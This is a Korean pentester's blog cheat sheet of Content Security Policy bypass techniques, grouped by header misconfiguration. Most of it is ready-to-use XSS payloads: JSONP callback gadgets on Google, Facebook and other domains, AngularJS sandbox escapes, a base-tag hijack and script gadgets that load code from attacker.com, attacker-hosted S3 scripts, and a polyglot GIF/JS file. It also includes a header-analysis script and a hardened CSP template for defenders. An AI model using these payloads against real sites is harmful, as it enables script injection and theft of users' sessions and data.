---
layout: post
title: CSP Bypass
subtitle: CSP Bypass Cheatsheet
author: g3rm
categories: Web
banner:
  image: /assets/images/banners/home.gif
  opacity: 0.618
  background: "#000"
  heading_style: "font-size: 4.25em; font-weight: bold;"
  subheading_style: "color: gold"
tags:
  - XSS
  - CSP
  - JSONP
  - AngularJS
  - DOM_Clobbering
sidebar:
---
## Intro

XSS 진단을 하다 보면 페이로드는 정확히 들어갔는데 CSP에 막혀서 트리거가 안되는 경우가 자주 있습니다. 이때마다 매번 CSP 헤더를 분석하고 우회 방법을 검색하는 게 귀찮아서, **헤더 패턴별로 바로 꺼내쓸 수 있는 우회 페이로드**를 정리해두려고 합니다.

CSP는 분명 강력한 방어 수단이지만, 한 줄 한 줄 잘못 설정된 부분만 찾으면 우회는 거의 항상 가능하다는 게 진단하면서 느낀 점입니다. `'unsafe-inline'` 한 줄, 화이트리스트 도메인 하나, base-uri 누락 하나만 있어도 결국 뚫립니다.

이 글은 [XSS](#) 글의 CSP 우회 섹션을 심화한 포스트입니다. CSP 헤더 패턴별로 매칭되는 페이로드를 빠르게 찾을 수 있게 정리했습니다.

## Detect

진단 시작 시 가장 먼저 하는 작업입니다.

```bash
# CSP 헤더 추출
curl -sI https://victim.com | grep -i "content-security-policy"

# meta 태그로 설정된 경우도 확인
curl -s https://victim.com | grep -oP '<meta[^>]*Content-Security-Policy[^>]*>'

# 한방에 분석 (jq 활용)
curl -sI https://victim.com | grep -i "content-security-policy" | tr ';' '\n'
```

> 🔥 **헤더 보자마자 봐야 할 4가지**
> 1. `script-src`에 `'unsafe-inline'` / `'unsafe-eval'` 있는가?
> 2. 화이트리스트 도메인 중 JSONP나 Angular CDN이 있는가?
> 3. `base-uri`가 설정되어 있는가? (없으면 거의 항상 우회 가능)
> 4. `object-src 'none'` 빠져있는가?

[CSP Evaluator](https://csp-evaluator.withgoogle.com/) 에 헤더 붙여넣으면 위 4가지 자동으로 짚어줍니다.

## 패턴별 우회 페이로드

### 1. `'unsafe-inline'` 허용

```
Content-Security-Policy: script-src 'self' 'unsafe-inline'
```

이건 사실상 CSP 미적용입니다. 모든 inline script 그대로 동작합니다.

```html
<script>alert(1)</script>
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
```

> ☑️ 이 케이스는 보고서 권고사항에 `'unsafe-inline'` 제거 + nonce 기반 전환 가이드를 같이 넣어줘야 합니다.

### 2. `'unsafe-eval'` 허용

```
Content-Security-Policy: script-src 'self' 'unsafe-eval'
```

inline은 막혀있지만 eval 계열 함수가 살아있습니다. 외부에서 데이터를 가져와서 eval로 실행하는 우회가 가능합니다.

```html
<script src="/jsonp?callback=eval&payload=alert(1)"></script>

<!-- AngularJS가 함께 있는 경우 -->
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
```

```javascript
// eval 직접 호출
eval('alert(1)')
Function('alert(1)')()
setTimeout('alert(1)', 0)
setInterval('alert(1)', 0)
```

### 3. JSONP Endpoint 화이트리스트

가장 자주 보이는 우회 케이스입니다.

```
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com
```

화이트리스트에 들어간 도메인이 JSONP를 지원하면, 콜백 파라미터에 페이로드를 넣어 실행시킬 수 있습니다.

#### 자주 쓰이는 JSONP Gadget

```html
<!-- Google -->
<script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(1)"></script>

<!-- Google Translate -->
<script src="https://translate.googleapis.com/translate_a/element.js?cb=alert(1)"></script>

<!-- Google Maps -->
<script src="https://maps.googleapis.com/maps/api/js?callback=alert(1)"></script>

<!-- Microsoft -->
<script src="https://www.bing.com/api/maps/mapcontrol?callback=alert(1)"></script>

<!-- Facebook -->
<script src="https://www.facebook.com/connect/ping?client_id=1&domain=x&origin=1&redirect_uri=1&response_type=token&callback=alert(1)"></script>

<!-- VK -->
<script src="https://vk.com/js/api/openapi.js?onload=alert(1)"></script>

<!-- Yandex -->
<script src="https://yastatic.net/jquery/3.1.0/jquery.min.js?callback=alert(1)"></script>
```

> 🔥 화이트리스트 도메인 발견 시 [JSONBee](https://github.com/zigoo0/JSONBee) 저장소에서 해당 도메인의 JSONP gadget 빠르게 찾을 수 있습니다. 거의 모든 메이저 도메인이 정리되어 있어서 진단 시 1순위로 확인합니다.

### 4. AngularJS CDN 화이트리스트

```
Content-Security-Policy: script-src 'self' https://ajax.googleapis.com https://cdnjs.cloudflare.com
```

AngularJS는 자체 표현식 평가 엔진이 있어서, AngularJS만 로드되면 CSP를 무력화할 수 있습니다.

#### Sandbox Escape 페이로드 (버전별)

```html
<!-- AngularJS 1.0.x ~ 1.1.x -->
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.min.js"></script>
<div ng-app ng-csp>
{{constructor.constructor('alert(1)')()}}
</div>
```

```html
<!-- AngularJS 1.6.x 이상 (현재 가장 흔함) -->
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1)>click</div>
```

```html
<!-- 클릭 없이 자동 트리거 -->
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<div ng-app ng-csp>
  <input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'">
</div>
```

```html
<!-- Prototype.js 화이트리스트 시 -->
<script src="https://ajax.googleapis.com/ajax/libs/prototype/1.7.2.0/prototype.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angular_js/1.7.7/angular.js"></script>
<div ng-app ng-csp>
  {{$on.curry.call().alert(1)}}
</div>
```

> ☑️ Angular는 버전마다 sandbox escape payload가 다릅니다. CDN URL의 버전 보고 [PortSwigger AngularJS Sandbox](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escape) 에서 매칭되는 페이로드 가져오는 게 빠릅니다.

### 5. `base-uri` 미설정

```
Content-Security-Policy: script-src 'self' 'nonce-r4nd0m'
# base-uri 없음
```

nonce가 적용된 강력한 CSP라도 `base-uri`가 빠져있으면 우회됩니다. nonce를 가진 기존 script 태그가 상대경로로 다른 script를 로드하는 경우 활용 가능합니다.

```html
<!-- 페이지 내 nonce 적용된 외부 script가 상대경로로 로드되는 경우 -->
<!-- 원본: <script nonce="r4nd0m" src="/js/app.js"></script> -->

<!-- 우회 페이로드 -->
<base href="https://attacker.com/">

<!-- 이후 /js/app.js 가 https://attacker.com/js/app.js 로 변경되어 로드 -->
<!-- attacker.com에 동일 경로로 악성 JS 호스팅하면 nonce가 그대로 적용된 채 실행 -->
```

> 🔥 **이게 가장 임팩트 있는 우회 중 하나**입니다. CSP는 완벽해 보이는데 base-uri 한 줄 빠진 걸로 통째로 무너지는 케이스를 진단하면서 여러 번 봤습니다.

### 6. `'strict-dynamic'` + Script Gadget

```
Content-Security-Policy: script-src 'nonce-r4nd0m' 'strict-dynamic'
```

`strict-dynamic`은 nonce를 가진 script가 동적으로 추가하는 script도 신뢰합니다. 만약 페이지 내에 사용자 입력을 받아 script를 생성하는 라이브러리(Script Gadget)가 있으면 우회됩니다.

#### 흔한 Script Gadgets

```html
<!-- 페이지에 jQuery + DOMPurify가 있고, $(...).html() 형태로 사용자 입력을 처리하는 경우 -->
<form id="csrf-token" data-html="<script src=//attacker.com/x.js></script>"></form>

<!-- Bootstrap data-target 활용 -->
<button data-toggle="tooltip" title="<script>alert(1)</script>">x</button>

<!-- Knockout.js 사용 시 -->
<div data-bind="html:'<svg/onload=alert(1)>'"></div>

<!-- jQuery Mobile -->
<div data-role="page" id="p"><script src="//attacker.com/x.js"></script></div>
```

> ☑️ Script Gadget은 [google/security-research-pocs](https://github.com/google/security-research-pocs/tree/master/script-gadgets) 와 [BlackHat 2017 Lekies 발표자료](https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf)에 라이브러리별로 잘 정리되어 있습니다.

### 7. `object-src` 미설정 / 미차단

```
Content-Security-Policy: script-src 'self'
# object-src 없음 → default-src로 fallback, 없으면 모두 허용
```

```html
<!-- object 태그로 우회 -->
<object data="data:text/html,<script>alert(1)</script>"></object>
<embed src="data:text/html,<script>alert(1)</script>">

<!-- Flash가 살아있는 환경 (구식이지만 가끔 보임) -->
<object data="https://attacker.com/payload.swf"></object>
```

### 8. CDN/Storage Bucket Wildcard

```
Content-Security-Policy: script-src 'self' *.amazonaws.com *.cloudfront.net
```

S3 같은 사용자 업로드 가능 도메인이 wildcard로 허용된 경우, 자신의 버킷에 JS 올려서 로드시킵니다.

```html
<!-- 공격자가 S3 버킷 생성 후 -->
<script src="https://attacker-bucket.s3.amazonaws.com/payload.js"></script>

<!-- 또는 같은 서비스에 사용자 업로드 기능이 있다면 -->
<!-- 1. JS 파일을 이미지로 위장해서 업로드 -->
<!-- 2. Content-Type 검증이 약하면 그대로 로드 -->
<script src="https://victim-cdn.amazonaws.com/uploads/payload.jpg"></script>
```

### 9. Path 허용 우회 (Open Redirect)

```
Content-Security-Policy: script-src 'self' https://api.victim.com/safe/
```

특정 경로만 허용한 듯 보이지만, **CSP는 경로 검증이 엄격하지 않습니다**. Open Redirect가 있으면 우회됩니다.

```html
<!-- victim.com/redirect?url=... 에 Open Redirect 존재 시 -->
<script src="https://victim.com/redirect?url=https://attacker.com/payload.js"></script>

<!-- path traversal 스타일 -->
<script src="https://api.victim.com/safe/../../malicious/payload.js"></script>
```

### 10. File Upload + Content-Type Sniffing

```
Content-Security-Policy: script-src 'self'
```

서비스 자체에 파일 업로드 기능이 있고, 업로드된 파일이 `'self'` 도메인에서 서빙된다면 우회 가능합니다.

```html
<!-- 1. JS 코드를 이미지/PDF/SVG에 위장해서 업로드 -->
<!-- alert(1) 만 들어있는 image.gif 업로드 후 -->
<script src="https://victim.com/uploads/image.gif"></script>

<!-- X-Content-Type-Options: nosniff 없으면 브라우저가 알아서 JS로 실행 -->
```

```bash
# polyglot 파일 생성 (gif + js)
echo -e "GIF89a\nalert(1)//" > polyglot.gif
file polyglot.gif    # GIF image data 로 인식됨
```

### 11. iframe + CSP 우회

자식 iframe의 CSP는 부모와 별개입니다. 부모의 CSP가 강력해도 iframe 자체에 CSP가 없거나 약하면 우회 가능합니다.

```html
<!-- srcdoc은 부모 CSP 상속하지만 -->
<iframe srcdoc="<script>alert(1)</script>"></iframe>

<!-- 외부 페이지 로드는 그쪽 CSP를 따름 -->
<iframe src="https://attacker.com/payload.html"></iframe>

<!-- data: URI는 동일 출처가 아니므로 별도 컨텍스트 -->
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
```

> 🔥 부모 페이지 통제가 어려우면 iframe 안에서 부모로 메시지 보내는(`postMessage`) 방식으로 데이터 탈취 가능합니다.

### 12. DOM Clobbering으로 Nonce 탈취

```
Content-Security-Policy: script-src 'nonce-{server-generated}'
```

페이지에 적용된 nonce 값을 추측하긴 어렵지만, DOM에서 끄집어내는 경우가 있습니다.

```html
<!-- 페이지에 이런 코드가 있다면 -->
<script>
var s = document.createElement('script');
s.src = userInput;
s.nonce = document.currentScript.nonce;  // 현재 script의 nonce 재사용
document.body.appendChild(s);
</script>

<!-- 페이로드: userInput으로 attacker.com/x.js 주입 -->
<!-- → nonce가 자동 복사되어 CSP 통과 -->
```

## 한 줄 헤더 → 페이로드 매핑 (Quick Reference)

| CSP 패턴 | 우회 페이로드 1순위 |
| --- | --- |
| `'unsafe-inline'` 허용 | `<script>alert(1)</script>` 그냥 들어감 |
| `'unsafe-eval'` 허용 | `eval('alert(1)')`, AngularJS 표현식 |
| `*.googleapis.com` 화이트리스트 | AngularJS sandbox escape |
| `*.google.com` 화이트리스트 | Google Search JSONP |
| `base-uri` 미설정 | `<base href="//attacker.com/">` |
| `object-src` 미설정 | `<object data="data:text/html,...">` |
| `*.amazonaws.com` wildcard | 공격자 S3 버킷에 JS 호스팅 |
| `'strict-dynamic'` + jQuery | Script Gadget으로 동적 script 생성 |
| 자체 도메인 업로드 가능 | polyglot 파일 + Content-Type sniffing |
| `'self'` + Open Redirect | redirect 통한 외부 JS 로드 |

> ☑️ 이 표만 옆에 띄워놓고 진단해도 80% 케이스는 빠르게 처리됩니다.

## PoC - CSP 자동 분석 도구

진단 시작 시 헤더 보고 우회 가능 여부를 빠르게 판단하는 스크립트입니다.

```python
# Python 3.11 / requests 2.31.0
# pip install requests==2.31.0
import requests
import logging
import re
from urllib.parse import urlparse

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(message)s')

# 알려진 위험 도메인 (JSONP / AngularJS gadget 보유)
RISKY_DOMAINS = {
    'googleapis.com': 'AngularJS Sandbox Escape',
    'ajax.googleapis.com': 'AngularJS Sandbox Escape',
    'cdnjs.cloudflare.com': 'AngularJS / Multiple JS lib gadgets',
    'google.com': 'Google Search JSONP (jsonp=alert(1))',
    'translate.googleapis.com': 'Google Translate JSONP',
    'maps.googleapis.com': 'Google Maps JSONP',
    'youtube.com': 'YouTube JSONP gadget',
    'facebook.com': 'Facebook Connect JSONP',
    'amazonaws.com': 'S3 Bucket - Attacker upload possible',
    'cloudfront.net': 'CloudFront - Origin upload check',
    'github.io': 'GitHub Pages - Attacker can host',
    'githubusercontent.com': 'GitHub Raw - Attacker can host',
    'unpkg.com': 'NPM CDN - Attacker package',
    'jsdelivr.net': 'NPM/GitHub CDN - Attacker package',
}

DANGEROUS_KEYWORDS = {
    "'unsafe-inline'": '[CRIT] All inline scripts allowed',
    "'unsafe-eval'": '[HIGH] eval() / Function() allowed',
    "'unsafe-hashes'": '[MED] Inline event handler allowed (specific hashes)',
    "data:": '[HIGH] data: scheme allowed - data:text/html injection',
    "blob:": '[MED] blob: scheme allowed',
    "*": '[CRIT] Wildcard allows everything',
    "http:": '[MED] HTTP allowed (MITM possible)',
    "filesystem:": '[MED] filesystem: scheme allowed',
}

def analyze_csp(url):
    """CSP 헤더 분석 후 우회 포인트 출력"""
    logging.info(f"[+] Analyzing CSP for: {url}")
    
    try:
        r = requests.get(url, timeout=10, allow_redirects=True)
    except requests.exceptions.RequestException as e:
        logging.error(f"[ERR] {e}")
        return
    
    csp_header = r.headers.get('Content-Security-Policy') or \
                 r.headers.get('Content-Security-Policy-Report-Only')
    
    # meta 태그도 체크
    if not csp_header:
        meta_match = re.search(
            r'<meta[^>]*http-equiv=["\']Content-Security-Policy["\'][^>]*content=["\']([^"\']+)',
            r.text, re.IGNORECASE
        )
        if meta_match:
            csp_header = meta_match.group(1)
            logging.info("[!] CSP found in <meta> tag (weaker than header)")
    
    if not csp_header:
        logging.warning("[CRIT] No CSP found - any XSS payload works")
        return
    
    print("\n" + "="*70)
    print(f"[CSP Header]\n{csp_header}")
    print("="*70 + "\n")
    
    # 디렉티브 단위 분석
    directives = {}
    for d in csp_header.split(';'):
        parts = d.strip().split(None, 1)
        if not parts:
            continue
        name = parts[0].lower()
        values = parts[1] if len(parts) > 1 else ''
        directives[name] = values
    
    # 1. 위험 키워드 검사
    print("[*] Dangerous Keyword Check")
    found_risk = False
    script_src = directives.get('script-src') or directives.get('default-src', '')
    for kw, desc in DANGEROUS_KEYWORDS.items():
        if kw in script_src:
            logging.warning(f"    {desc}: {kw}")
            found_risk = True
    if not found_risk:
        logging.info("    No dangerous keywords in script-src")
    
    # 2. 화이트리스트 도메인 검사
    print("\n[*] Whitelisted Domain Check (JSONP / Gadget)")
    found_gadget = False
    for risky, gadget in RISKY_DOMAINS.items():
        if risky in script_src:
            logging.warning(f"    [GADGET] {risky} → {gadget}")
            found_gadget = True
    if not found_gadget:
        logging.info("    No known risky domains found")
    
    # 3. 누락 디렉티브 검사
    print("\n[*] Missing Directive Check")
    critical_directives = {
        'base-uri': "[HIGH] Missing base-uri → <base href='//attacker.com/'>",
        'object-src': "[HIGH] Missing object-src → <object data='data:text/html,...'>",
        'frame-ancestors': "[MED] Missing frame-ancestors → Clickjacking possible",
        'form-action': "[MED] Missing form-action → Form hijacking possible",
    }
    for d, msg in critical_directives.items():
        if d not in directives:
            logging.warning(f"    {msg}")
    
    # 4. nonce / strict-dynamic 검사
    print("\n[*] Nonce / strict-dynamic Check")
    if 'nonce-' in script_src:
        logging.info("    [+] Nonce-based CSP detected (strong)")
        if "'strict-dynamic'" in script_src:
            logging.info("    [+] strict-dynamic enabled")
            logging.warning("    [POTENTIAL] Look for Script Gadgets (jQuery, Bootstrap, etc.)")
    else:
        logging.warning("    [INFO] No nonce - relies on whitelist (weaker)")
    
    print("\n" + "="*70)
    logging.info("[+] Analysis done.")
    print("="*70)


if __name__ == '__main__':
    # RoE 범위 내 진단 환경에서만 사용
    target = 'https://victim.example.com'
    analyze_csp(target)
```

> ☑️ 이 스크립트를 Burp Suite extension으로 만들어두면 진단 자동화에 더 좋을 것 같아 추후 별도 포스트로 다뤄볼 예정입니다.

## Defense - 진단자가 권고할 CSP 템플릿

진단 보고서 권고사항 작성 시 자주 쓰는 강력한 CSP 템플릿입니다.

```
Content-Security-Policy: 
    default-src 'none';
    script-src 'nonce-{RANDOM}' 'strict-dynamic';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    font-src 'self';
    connect-src 'self';
    frame-ancestors 'none';
    base-uri 'none';
    form-action 'self';
    object-src 'none';
    require-trusted-types-for 'script';
```

핵심 포인트:
- `script-src`: nonce + `'strict-dynamic'` (화이트리스트 X)
- `base-uri 'none'`: base 태그 인젝션 차단
- `object-src 'none'`: object/embed 차단
- `frame-ancestors 'none'`: 클릭재킹 + iframe 임베딩 차단
- `default-src 'none'`: 명시적으로 허용한 것 외 전부 차단

## References

- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [JSONBee - JSONP Endpoints DB](https://github.com/zigoo0/JSONBee)
- [PortSwigger - CSP Bypass](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)
- [PayloadsAllTheThings - CSP Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CSP%20Injection/README.md)
- [Google Script Gadget Research](https://github.com/google/security-research-pocs/tree/master/script-gadgets)
- [BlackHat 2017 - Don't Trust The DOM](https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf)
- [Bypassing CSP using Polyglot JPEGs](https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs)


 










